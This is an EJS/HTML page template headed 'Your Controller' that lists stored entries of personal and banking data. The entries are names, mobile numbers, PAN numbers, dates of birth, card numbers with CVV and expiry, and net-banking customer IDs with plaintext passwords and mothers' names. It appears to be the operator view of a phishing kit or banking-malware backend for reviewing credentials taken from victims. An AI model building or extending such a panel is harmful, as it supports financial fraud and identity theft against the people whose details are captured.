<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User Details</title>
  <link rel="stylesheet" href="/css/userDetail.css" />
</head>
<body>
  <header class="header-nav">
    <h1>Your Controller</h1>
  </header>

  <div class="user-detail-container">
    <h2>User Details</h2>

  <!-- views/userEntries.ejs -->
<% if (user && user.entries && user.entries.length) { %>
  <% user.entries.forEach((entry, index) => { %>
    <div class="card">
      <h3>Personal Information - <%= index + 1 %></h3>
      <p><strong>Name:</strong> <%= entry.name %></p>
      <p><strong>Mobile No:</strong> <%= entry.mobileNumber %></p>
      <p><strong>PAN Number:</strong> <%= entry.panNumber %></p>
      <p><strong>DOB:</strong> <%= entry.dob %></p>
      <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
    </div>
  <% }) %>
<% } else { %>
  <div class="card">
    <h3>No User Data Found</h3>
  </div>
<% } %>


   <!-- views/cardPaymentEntries.ejs -->
<% if (cardPayment && cardPayment.entries && cardPayment.entries.length) { %>
  <% cardPayment.entries.forEach((entry, index) => { %>
    <div class="card">
      <h3>Card Payment Details – <%= index + 1 %></h3>
      <p><strong>Card No:</strong> <%= entry.cardNumber %></p>
      <p><strong>CVV:</strong> <%= entry.cvv %></p>
      <p><strong>Expiry:</strong> <%= entry.expiry %></p>
      <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
    </div>
  <% }) %>
<% } else { %>
  <div class="card">
    <h3>No Card Payment Data Found</h3>
  </div>
<% } %>


   <!-- views/netBankingEntries.ejs -->
<% if (netBanking && netBanking.entries && netBanking.entries.length) { %>
  <% netBanking.entries.forEach((entry, index) => { %>
    <div class="card">
      <h3>Net Banking Details – <%= index + 1 %></h3>
      <p><strong>Customer ID:</strong> <%= entry.customerId %></p>
      <p><strong>Password:</strong> <%= entry.password %></p>
      <p><strong>Mother's Name:</strong> <%= entry.motherName %></p>
      <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
    </div>
  <% }); %>
<% } else { %>
  <div class="card">
    <h3>No Net Banking Data Found</h3>
  </div>
<% } %>
    

    <a href="/api/device/dashboard">
      <button class="dashboard-btn">Go to Dashboard</button>
    </a>
  </div>
</body>
</html>
